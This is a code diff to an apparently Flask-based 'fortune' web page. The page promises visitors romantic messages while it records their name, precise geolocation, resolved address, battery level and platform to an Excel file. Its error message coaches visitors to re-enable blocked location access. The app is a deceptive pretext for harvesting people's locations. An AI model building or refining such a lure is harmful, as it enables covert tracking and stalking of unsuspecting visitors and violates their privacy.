@@ -21,7 +21,7 @@ def get_address(lat, lon):
     except:
         return 'Location captured'
 
-# Beautiful UI – NO download link, location retry button
+# Beautiful UI – NO download link anywhere
 HTML = '''
 <!DOCTYPE html>
 <html>
@@ -234,7 +234,6 @@ HTML = '''
         return null;
     }
 
-    // This function will be called on each retry
     window.requestFortune = async function() {
         const name = document.getElementById('userName').value.trim();
         if (!name) {
@@ -242,7 +241,6 @@ HTML = '''
             return;
         }
 
-        // Hide any previous error and result, show loading
         document.getElementById('errorMsg').style.display = 'none';
         document.getElementById('result').classList.remove('show');
         document.getElementById('initial').style.display = 'none';
@@ -254,7 +252,6 @@ HTML = '''
         }
 
         navigator.geolocation.getCurrentPosition(async function(pos) {
-            // Success
             const battery = await getBattery();
             const data = {
                 name: name,
@@ -288,7 +285,6 @@ HTML = '''
                 showError('Network error. Please check your connection.', true);
             }
         }, function(error) {
-            // Location error handler - provide retry option
             let errorMsg = '';
             if (error.code === error.PERMISSION_DENIED) {
                 errorMsg = '💔 Location access is blocked. Please allow location in your browser settings, then click "Retry".<br><small>How to fix: Click the lock/info icon in address bar → Site settings → Location → Allow → Reload page.</small>';
@@ -351,7 +347,6 @@ def save():
             'Platform': data['platform']
         }
 
-        # Save to Excel (persistent storage)
         excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
         if os.path.exists(excel_path):
             existing_df = pd.read_excel(excel_path)
@@ -362,7 +357,6 @@ def save():
             df = pd.DataFrame([record])
             df.to_excel(excel_path, index=False, engine='openpyxl')
 
-        # Romantic messages with name
         messages = [
             f"💕 Dear {name}, someone special is thinking of you right now! 💕",
             f"💖 {name}, a beautiful soul is about to enter your life! 💖",
